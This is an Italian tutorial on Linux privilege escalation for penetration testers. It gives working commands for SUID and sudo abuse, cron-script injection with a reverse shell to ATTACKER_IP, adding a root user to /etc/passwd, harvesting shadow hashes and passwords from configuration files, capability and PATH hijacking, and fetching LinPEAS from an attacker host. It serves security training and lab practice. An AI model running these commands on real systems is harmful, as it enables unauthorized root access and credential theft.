# Privilege Escalation su Linux: da utente normale a root

## Introduzione

Hai ottenuto una shell su un sistema Linux. L'utente è `www-data` o qualche altro utente con privilegi minimi. L'obiettivo finale è quasi sempre diventare **root**.

La **privilege escalation** (privesc) è il processo di elevare i propri privilegi da utente normale a superutente. È una fase critica in ogni penetration test — e una delle più creative.

Non esiste una lista magica di comandi che funziona sempre. Bisogna **enumerare**, capire il sistema, e trovare la debolezza specifica di quella configurazione.

---

## Enumerazione: prima di tutto, capisci dove sei

```bash
# Chi sono?
id
whoami

# Che sistema è?
uname -a
cat /etc/os-release

# Quali utenti esistono?
cat /etc/passwd
cat /etc/shadow   # (se accessibile)

# A quali gruppi appartengo?
groups

# Processi in esecuzione
ps aux
ps aux | grep root

# Servizi di rete in ascolto
netstat -tulnp
ss -tulnp

# Applicazioni installate
dpkg -l         # Debian/Ubuntu
rpm -qa         # RedHat/CentOS

# Variabili d'ambiente
env
echo $PATH
```

---

## Vettori comuni di privilege escalation

### 1. SUID / SGID binaries

I file con il bit **SUID** settato vengono eseguiti con i permessi del proprietario del file, non dell'utente che li avvia. Se un file SUID è di root e ha una vulnerabilità (o può essere abusato), ottieni root.

```bash
# Trova tutti i file SUID
find / -perm -4000 -type f 2>/dev/null

# Trova tutti i file SGID
find / -perm -2000 -type f 2>/dev/null
```

Esempi di binari SUID abusabili: `bash`, `vim`, `find`, `cp`, `nmap` (versioni vecchie).

Consulta **GTFOBins** (`gtfobins.github.io`) per ogni binario: ti dice se e come può essere abusato.

```bash
# Esempio: find con SUID
find . -exec /bin/sh -p \; -quit
# Il -p mantiene i privilegi SUID
```

### 2. Sudo misconfiguration

```bash
# Cosa posso eseguire con sudo?
sudo -l
```

Output di esempio:
```
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
```

Questo significa che posso eseguire `vim` come root senza password. GTFOBins mi dice come:

```bash
sudo vim -c ':!/bin/bash'
```

Boom, shell root.

### 3. Cron jobs

I cron job eseguiti da root che fanno riferimento a script scrivibili dall'utente corrente sono ottimi vettori.

```bash
# Cron di sistema
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Cron di altri utenti (se accessibili)
cat /var/spool/cron/crontabs/root
```

Esempio: se root esegue ogni minuto `/opt/backup/cleanup.sh` e quel file è scrivibile da noi:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup/cleanup.sh
# Aspetta il cron e ricevi la reverse shell come root
```

### 4. Permessi deboli su file critici

```bash
# /etc/passwd scrivibile? (rarissimo ma succede)
ls -la /etc/passwd
# Se scrivibile, aggiungi un utente root:
echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd

# /etc/shadow leggibile?
ls -la /etc/shadow
# Copia gli hash e craccali con hashcat

# File di configurazione con credenziali
find / -name "*.conf" -readable 2>/dev/null
find / -name "*.config" -readable 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
```

### 5. Capabilities

Linux capabilities dividono i privilegi di root in unità più granulari. Alcune sono pericolose se assegnate a binari normali.

```bash
# Trova capability assegnate
getcap -r / 2>/dev/null
```

Esempio pericoloso: `python3 cap_setuid+eip`

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 6. Kernel exploits

Se il kernel è vecchio e non patchato, potrebbe essere vulnerabile a exploit pubblici.

```bash
uname -r
# Cerca su searchsploit o exploit-db per quella versione
searchsploit linux kernel 5.4

# Dirty Cow (CVE-2016-5195) — famoso, funziona su kernel 2.6-4.8
# PwnKit (CVE-2021-4034) — polkit, molto recente e diffuso
```

> **Attenzione:** gli exploit kernel possono crashare il sistema. In ambienti di produzione, usali solo se strettamente necessario e dopo backup.

### 7. PATH hijacking

Se un script eseguito da root chiama un binario senza path assoluto, e noi controlliamo il `$PATH`...

```bash
# Script vulnerabile (eseguito da root):
# #!/bin/bash
# backup /home   ← chiama "backup" senza path assoluto

# Crea un falso "backup" in una directory che controlliamo
echo "/bin/bash" > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH

# Quando lo script viene eseguito da root, esegue il nostro /tmp/backup
```

---

## LinPEAS e LinEnum: automazione dell'enumerazione

**LinPEAS** è lo script di enumerazione automatica più completo per Linux. Trova in pochi minuti centinaia di potenziali vettori.

```bash
# Scarica e trasferisci sul target
# Da attacker
python3 -m http.server 8080

# Sul target
wget http://ATTACKER_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt
```

L'output è colorato: **rosso/giallo** indica i vettori più probabili.

---

## Conclusione

La privilege escalation su Linux è un campo enorme. Ogni sistema è diverso — la stessa tecnica non funziona sempre. La differenza tra un penetration tester mediocre e uno bravo sta nella capacità di **enumerare sistematicamente** e **capire perché** qualcosa è sfruttabile.

Risorse per esercitarsi:
- **TryHackMe** — room "Linux PrivEsc"
- **HackTheBox** — macchine Linux di difficoltà Easy/Medium
- **GTFOBins** — `gtfobins.github.io` — bibbia per SUID/sudo abuse
- **PayloadsAllTheThings** — repository GitHub con cheat sheet completi
